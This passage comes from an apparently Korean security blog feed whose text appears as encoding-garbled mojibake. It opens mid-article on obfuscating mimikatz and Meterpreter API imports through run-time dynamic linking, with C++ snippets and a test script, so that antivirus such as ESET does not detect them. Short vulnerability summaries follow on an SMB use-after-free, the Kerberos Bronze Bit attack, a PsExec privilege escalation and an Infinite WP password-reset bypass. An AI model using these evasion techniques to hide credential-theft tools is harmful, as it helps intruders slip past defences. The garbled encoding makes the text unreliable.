ë°œê²¬í–ˆë‹¤.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì€ AV ì—”ì§„ ì–´ë””ì—ì„œë„ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ìˆì§€ ì•Šì§€ë§Œ ë‚´ë¶€ íƒì§€ ì‹ ë¢° ì ìˆ˜ë¥¼ ë†’ì¸ë‹¤. ì´ëŸ¬í•œ í•¨ìˆ˜ì— <code>ApiCallConsumer</code>ë¥¼ ë“±ë¡í•´ì•¼ í•˜ë¯€ë¡œ ì´ë¦„ê³¼ í•¨ìˆ˜ í”„ë¡œí† íƒ€ì…ì´ í•„ìš”í•˜ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>ê·¸ í›„ ì´ëŸ¬í•œ ì»¬ë ‰ì…˜ì„ ë°˜ë³µí•˜ê³  ê° ì»¬ë ‰ì…˜ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ <code>main.cpp</code>ë¥¼ ì—…ë°ì´íŠ¸í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>ì—¬ê¸°ì„œ <code>std::make_unique</code>ëŠ” ì´ ë°˜ë³µë¬¸ì—ì„œ í™ì— ìˆëŠ” ê°ì²´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™”í•  ìˆ˜ ìˆê¸°ì— ì¤‘ìš”í•˜ê³  ë‚˜ì¤‘ì— ì´ëŸ¬í•œ ê°ì²´ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì‰½ê²Œ í•´ì œí•  ìˆ˜ ìˆë‹¤. ì´ê²ƒì€ ë” ì´ìƒ ì‚¬ìš©í•˜ì§€ ì•Šì„ ë•Œ ìë™ìœ¼ë¡œ í•´ì œë  ê²ƒì´ë‹¤.</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ mimikatz, íŠ¹íˆ <code>kuhl_m_lsadump.c</code>ë¡œ ë‚œë…í™”ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>ì´ê²ƒì€ í¥ë¯¸ë¡œìš´ ê²°ê³¼ë¥¼ ë§Œë“ ë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>ì—ì„œ ê°€ì ¸ì˜¨ APIë¥¼ ìœ„í•œ Run-time dynamic linking</p><p>ì‹¤ì œ í•¨ìˆ˜ í˜¸ì¶œì€ ì™„ë²½í•˜ê²Œ ìˆ˜ì •ë˜ì—ˆë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>ì—ì„œ ê°€ì ¸ì˜¨ í•¨ìˆ˜ í˜¸ì¶œë“¤ì€ ì™„ë²½í•˜ê²Œ ìˆ˜ì •ë˜ì—ˆë‹¤.</p><p><code>PRINT_ERROR</code> ë§¤í¬ë¡œ ë‚´ë¶€ì˜ ë¬¸ìì—´ì€ <code>do&#123;&#125;while(0)</code>ì„ í†µí•´ ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ë‚œë…í™” ë˜ì§€ ì•Šì•˜ë‹¤. obfuscatorì˜ ë²„ê·¸ë¥¼ ì°¾ëŠ”ë° <code>mimikatz</code>ë³´ë‹¤ ì¢‹ì€ í”„ë¡œì íŠ¸ë¥¼ ì°¾ê¸° ëª»í–ˆë‹¤.</p><h2 id="ê°œì„ ì‚¬í•­"><a href="#ê°œì„ ì‚¬í•­" class="headerlink" title="ê°œì„ ì‚¬í•­"></a>ê°œì„ ì‚¬í•­</h2><p>ì´ ë¶€ë¶„ì€ ì—¬ëŸ¬ë¶„ì„ ìœ„í•´ ë‚¨ê²¨ì§„ ì‘ì—…ë“¤ì´ë‹¤ ğŸ™‚</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linkingì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì‹¤ì œë¡œ API <code>LoadLibrary/GetProcAddress</code>ê°€ í•„ìš”í•˜ì§€ ì•Šë‹¤.</p><p>í›„í‚¹ì„ í”¼í•˜ê¸° ìœ„í•´ ì´ í•¨ìˆ˜ë“¤ì€ ì¬êµ¬í˜„í•˜ëŠ” ê²ƒì´ ì¢‹ê³  ì´ë¯¸ ê·¸ê²ƒì„ í•  ìˆ˜ ìˆëŠ” ì˜¤í”ˆì†ŒìŠ¤ í”„ë¡œì íŠ¸ê°€ ìˆë‹¤.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>ì—¬ê¸°ê¹Œì§€ ì½ì—ˆë‹¤ë©´, translation unitì˜ ìƒë‹¨ì— ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì„ ìœ„í•œ êµ¬í˜„ì„ ì¶”ê°€í•˜ê³ (<code>findInjectionSpot</code> ì‚¬ìš©) WinAPI ëŒ€ì‹ ì— êµ¬í˜„ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ë©”ì†Œë“œ <code>addGetProcAddress</code>ë¥¼ ì—…ë°ì´íŠ¸í•˜ë©´ ëœë‹¤ëŠ” ê²ƒì„ ì•Œ ê²ƒì´ë‹¤.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>ëŠ” ì„±ê³µì ìœ¼ë¡œ ìˆ˜í–‰ë˜ì§€ ì•Šì„ ê²½ìš° <code>NULL</code>ì„ ë°˜í™˜í•˜ë¯€ë¡œ ì´ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ì¶”ê°€í•˜ì—¬ ì˜¤ë¥˜ë¥¼ ì •ìƒì ìœ¼ë¡œ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤. í˜„ì¬ ìƒí™©ì—ì„œ í¬ë˜ì‹œê°€ ë§¤ìš° ì˜ ë‚  ìˆ˜ë„ ìˆë‹¤.</li><li><code>GetProcAddress</code>ë„ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ <code>NULL</code>ì„ ë°˜í™˜í•˜ë¯€ë¡œ ì´ê²ƒë„ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤.</li></ul><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>ì´ ê¸€ì—ì„œ ìš°ë¦¬ëŠ” ì •ê·œì‹ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  C/C++ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ í•¨ìˆ˜ í˜¸ì¶œì„ ì •í™•í•˜ê²Œ êµì²´í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤¬ë‹¤. ëª¨ë“  ê²ƒì€ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ê°€ ìš°ë¦¬ê°€ pentestë¥¼ í•˜ëŠ” ë™ì•ˆ ì‚¬ìš©í•˜ëŠ” Meterpreterë‚˜ ë‹¤ë¥¸ ì†Œí”„íŠ¸ì›¨ì–´ì— ê´€í•´ í–‰ë™ ì •ë³´ë¥¼ ì •ì ìœ¼ë¡œ ìˆ˜ì§‘í•˜ëŠ” ê²ƒì„ ë§‰ê¸° ìœ„í•´ ì§„í–‰ë˜ì—ˆë‹¤.</p><p>ESET Nod32ì— ì ìš©ëœ ì´ ì‘ì—…ì€ ëª¨ë“  Meterpreter ëª¨ë“ˆì´ íƒì§€ë˜ì§€ ì•Šë„ë¡ í•˜ëŠ” ì£¼ìš” ë‹¨ê³„ì˜€ê³  ë” ë°œì „ëœ ì œí’ˆì— ë„ì›€ì´ ë˜ì—ˆë‹¤.</p><p>API importsë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒë„ í•˜ë‚˜ì§€ë§Œ ì•…ì„±ì½”ë“œê°€ ì‹¤í–‰ë˜ë©´ ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ê°€ API í˜¸ì¶œ ëª¨ë‹ˆí„°ë§ì— ì˜í•´ í–‰ë™ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ë°©ë²•ë„ ìˆë‹¤.</p><p>ê·¸ëŸ° ê´€ì ì—ì„œ ë‹¤ìŒ ê¸€ì€ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ Win32 APIê°€ ì§ì ‘ì ì¸ syscallsì„ í•˜ë„ë¡ ìë™ì ìœ¼ë¡œ refactoring í•˜ëŠ” ê²ƒì´ë‹¤. ì´ê²ƒì€ Cylance, Trapsê³¼ Kaspersky ê°™ì€ AVì˜ userland hookì„ í†µí•œ ëŸ°íƒ€ì„ íƒì§€ ìš°íšŒì˜ í•µì‹¬ ë‹¨ê³„ì´ë‹¤.</p><h2 id="ì¶œì²˜"><a href="#ì¶œì²˜" class="headerlink" title="ì¶œì²˜"></a>ì¶œì²˜</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
      <tag>iat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17140 : SMB uaf to info disclosure</title>
    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys ë“œë¼ì´ë²„</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)ì—ì„œ CVE-2020-17140ê°€ íŒ¨ì¹˜ë˜ì–´ Write-upì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. CVE-2020-17140ì€ <code>SMB2_SET_INFO</code> íŒ¨í‚·ì˜ ì²˜ë¦¬ ë¡œì§ì—ì„œ ë°œìƒí•˜ëŠ” use after freeë¡œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ë…¸ì¶œì‹œí‚¤ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>SMBv2 ì´í›„ë¶€í„° LEASEë¼ëŠ” ìƒˆë¡œìš´ caching mechanismì´ ë„ì…ë˜ì—ˆê³  í´ë¼ì´ì–¸íŠ¸ëŠ” <code>SMB2_CREATE_REQEUST_LEASE_V2</code> íŒ¨í‚·ì„ ë³´ë‚´ ê³µìœ  íŒŒì¼ì— leaseë¥¼ ìƒì„±í•˜ê³ , <code>SMB2_SET_INFO</code> íŒ¨í‚·ì„ ë³´ë‚´ ê³µìœ  íŒŒì¼ì˜ leaseë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>srv2.sys ë“œë¼ì´ë²„ëŠ” SMB2_SET_INFO íŒ¨í‚·ì„ ë°›ìœ¼ë©´ <code>srv2!Smb2UpdateLeaseFileName</code>ë¥¼ í˜¸ì¶œí•´ì„œ lease ì´ë¦„ì„ ìˆ˜ì •í•˜ëŠ”ë°, new lease nameì´ ê¸°ì¡´ì˜ old lease nameë³´ë‹¤ ê¸¸ ê²½ìš° ìƒˆë¡œìš´ ë©”ëª¨ë¦¬(newFileBuf)ë¥¼ í• ë‹¹í•´ old lease nameì„ ë°±ì—…í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease nameì„ ë‹´ê³  ìˆë˜ oldFileBufë¥¼ í• ë‹¹ í•´ì œí•œ í›„ì— newFileBufì— ë³µì‚¬í•˜ê¸° ë•Œë¬¸ì— use after freeê°€ ë°œìƒí•©ë‹ˆë‹¤. oldFileBufë¥¼ í•´ì œí•œ í›„ ëŒ•ê¸€ë§ í¬ì¸í„°ì˜ ìƒíƒœì— ë”°ë¼ kernel info leak ë˜ëŠ” BSoDë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>kernel</tag>
      
      <tag>use after free</tag>
      
      <tag>smb</tag>
      
      <tag>info leak</tag>
      
      <tag>bsod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
    <link href="/2020/12/11/l0ch/2020-12-11/"/>
    <url>/2020/12/11/l0ch/2020-12-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack â€“ Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>KerberosëŠ” Windows Active Directory ë„ë©”ì¸ ë‚´ì—ì„œ ì‚¬ìš©ì, ì„œë²„ ë° ê¸°íƒ€ ë¦¬ì†ŒìŠ¤ë¥¼ ì„œë¡œ ì¸ì¦í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤.<br>Kerberosì˜ ê¸°ì¡´ ê³µê²© ë°©ë²•ì¸ Golden Ticket ë° Silver Ticket ê³µê²©ì˜ ë³€í˜•ì¸ Bronze Bit ê³µê²©ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>Golden/Silver Ticket ê³µê²©<br>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì¹¨ì…í•œ ì´í›„ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì˜ Kerberos ì¸ì¦ì‹œìŠ¤í…œì„ ì‚¬ìš©í•˜ëŠ” ë‹¤ë¥¸ ì‹œìŠ¤í…œì˜ ìê²© ì¦ëª…ì„ ìœ„ì¡°í•˜ëŠ” ê³µê²©ê¸°ë²•</p></blockquote><br><p>Bronze BitëŠ” Microsoftê°€ Kerberos í”„ë¡œí† ì½œì— ì¶”ê°€ í•œ <code>S4U2self</code> ë° <code>S4U2proxy</code> í”„ë¡œí† ì½œì„ ì•…ìš©í•˜ë©° Kerberos í”„ë¡œì„¸ìŠ¤ê°€ ë³€ì¡°ëœ ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ê°ì§€í•  ìˆ˜ ì—†ì–´ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ì„ ìœ„í•´ì„œëŠ” ë‹¤ìŒ ì¡°ê±´ì´ ë§Œì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.</p><ol><li>í•´ì»¤ëŠ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì˜ ì‹œìŠ¤í…œ í•˜ë‚˜(Service1)ë¥¼ ì¥ì•…í•´ Active Directory ë‚´ì— ì ‘ê·¼ ê¶Œí•œì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.</li><li>ì¹¨ì…í•œ ì‹œìŠ¤í…œì¸ Service1ì— ëŒ€í•œ ì•”í˜¸ í•´ì‹œê°€ í•„ìš”í•©ë‹ˆë‹¤.</li><li>Service1ì—ëŠ” ë‹¤ë¥¸ ì‹œìŠ¤í…œ(Service2)ì— ëŒ€í•œ ì œí•œëœ ì‹ ë¢° ê´€ê³„ê°€ ìˆìŠµë‹ˆë‹¤.</li></ol><p>ìœ„ ì¡°ê±´ì´ ë§Œì¡±ë˜ë©´ í•´ì»¤ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li>ì‚¬ìš©ìë¥¼ ì‹ë³„í•˜ê³  í‹°ì¼“ì„ ë°˜í™˜í•˜ëŠ” <code>S4U2self</code> ì—ì„œ User2ì˜ Service1 ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë•Œ <code>force-forwardable</code> ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ë°˜í™˜í•˜ëŠ” ì„œë¹„ìŠ¤ í‹°ì¼“ì´ ì „ë‹¬ ê°€ëŠ¥í•œ í‹°ì¼“ìœ¼ë¡œ ë³€í™˜ë©ë‹ˆë‹¤.</li><li>Service1ì˜ í•´ì‹œë¡œ í‹°ì¼“ì„ ë³µí˜¸í™”í•˜ê³  í”Œë˜ê·¸ ê°’ì˜ ë‘ ë²ˆì§¸ ë¹„íŠ¸ë¥¼ 0â†’1 ë¡œ ë³€ê²½í•œ ë’¤ ë‹¤ì‹œ ì•”í˜¸í™”í•©ë‹ˆë‹¤. </li><li>ì¡°ì‘ëœ í‹°ì¼“ì€ <code>S4U2proxy</code> ì—ì„œ ì „ì†¡ë˜ê³  Service2ì— ëŒ€í•œ ì„œë¹„ìŠ¤ í‹°ì¼“ì´ User2ë¡œ ë°˜í™˜ë˜ì–´ <code>User2.ccache</code>ì˜ ë””ìŠ¤í¬ì— ê¸°ë¡ë©ë‹ˆë‹¤.</li><li>í•´ì»¤ëŠ” Service1 ìœ ì €(User1) ê¶Œí•œìœ¼ë¡œ Service2 ìœ ì €(User2)ì˜ Kerberos ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ì–»ì„ ìˆ˜ ìˆì–´ User2 ê¶Œí•œìœ¼ë¡œ Service2ì— ì•¡ì„¸ìŠ¤ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ol><p>ì´ëŠ” Golden/Silver Ticketê³¼ ìœ ì‚¬í•œ ê³µê²© ë°©ë²•ì´ì§€ë§Œ ë‹¨ì¼ ë¹„íŠ¸ í”Œë¦½ì„ ì´ìš©í–ˆê¸° ë•Œë¬¸ì— Bronze Bitë¡œ ëª…ëª…ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>kerberos</tag>
      
      <tag>bronze bit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] PsExec Local Privilege Escalation</title>
    <link href="/2020/12/10/idioth/2020-12-10/"/>
    <url>/2020/12/10/idioth/2020-12-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>ì•„ì§ íŒ¨ì¹˜ë˜ì§€ ì•Šì€ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p></blockquote><p>SysInternals Suiteì—ì„œ ì›ê²©ìœ¼ë¡œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” PsExecì—ì„œ Local Privilege Escalation ì·¨ì•½ì ì´ ë°œê²¬ëìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ê¸€ì„ ì‘ì„±í•œ ì‹œì ì˜ ë²„ì „ì¸ PsExec v2.2ê¹Œì§€ ì˜í–¥ì„ ë¯¸ì¹˜ë©° ì•„ì§ íŒ¨ì¹˜ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p><p>PsExec í´ë¼ì´ì–¸íŠ¸ì™€ ì›ê²© PSEXESVC ì„œë¹„ìŠ¤ëŠ” named pipeë¥¼ í†µí•´ í†µì‹ í•©ë‹ˆë‹¤. ê·¸ ì¤‘ <code>\\PSEXESVC</code> íŒŒì´í”„ëŠ” ì‹¤í–‰í•  ì‘ìš© í”„ë¡œê·¸ë¨, ëª…ë ¹ì¤„ ë°ì´í„° ë“± PsExec í´ë¼ì´ì–¸íŠ¸ì˜ ëª…ë ¹ì„ ë¶„ì„í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. <code>\\PSEXESVC</code> íŒŒì´í”„ëŠ” Administratorë§Œ read/write ê¶Œí•œì„ ê°€ì ¸ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ íŒŒì´í”„ì— read\write í•˜ëŠ” ê²ƒì„ ë§‰ìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ PSEXESVCê°€ <code>\\PSEXESVC</code> íŒŒì´í”„ë¥¼ ìƒì„±í•  ë•Œ íŒŒì´í”„ê°€ ì´ë¯¸ ì¡´ì¬í•  ê²½ìš° í•´ë‹¹ <code>\\PSEXESVC</code> íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ë”°ë¼ì„œ ë‚®ì€ ê¶Œí•œì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ PSEXESVCê°€ ì‹¤í–‰ë˜ê¸° ì „ì— <code>\\PSEXESVC</code> íŒŒì´í”„ë¥¼ ìƒì„±í•˜ë©´ PSEXESVCëŠ” ìì‹ ì´ ìƒì„±í•œ íŒŒì´í”„ê°€ ì•„ë‹Œ ì´ë¯¸ ì¡´ì¬í•˜ëŠ” íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜µë‹ˆë‹¤. PSEXESVCê°€ ë‚®ì€ ê¶Œí•œìœ¼ë¡œ ìƒì„±ëœ <code>\\PSEXESVC</code> íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜¤ë©´ PSEXESVCì„ í†µí•´ SYSTEM ê¶Œí•œìœ¼ë¡œ ëª…ë ¹, ì‘ìš© í”„ë¡œê·¸ë¨ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>named pipe</tag>
      
      <tag>psexec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-28642: Auth bypass via password reset mechanism</title>
    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress ì›¹ì‚¬ì´íŠ¸ì˜ ê´€ë¦¬ ì†”ë£¨ì…˜ Infinite WPì—ì„œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë°©ì‹ì˜ ê²°í•¨ì„ ì´ìš©í•´ admin panelì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì¸ì¦ ìš°íšŒ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë§í¬ë¥¼ ìƒì„±í•˜ëŠ” phpì½”ë“œì…ë‹ˆë‹¤.  í”¼í•´ìì˜ <code>email</code>ì„ ì‚¬ì „ì— ì…ìˆ˜í•˜ê³  <code>userID</code>,  <code>microtime(true)</code> ê°’ì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤ë©´ ëˆ„êµ¬ë‚˜ ìœ íš¨í•œ ë§í¬ë¥¼ íƒ€ê³  ì›í•˜ëŠ” ìœ ì €ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>userID<ul><li>auto-increment integerì…ë‹ˆë‹¤. manage-userë¼ëŠ” ìœ ë£Œ addonì„ êµ¬ë§¤í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ê¸°ë³¸ê°’ì´ 1ì…ë‹ˆë‹¤.</li></ul></li><li>email<ul><li>ê°€ì…ë˜ì§€ ì•Šì€ email ì£¼ì†Œë¼ë©´ <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>ë¡œ redirect ë©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ Infinite WPì— ê°€ì…ëœ emailì¸ì§€ íŒë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>microtime(true)<ul><li>microtime(true)ì˜ ê°’ì€ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë§í¬ê°€ ë§Œë“¤ì–´ì§ˆ 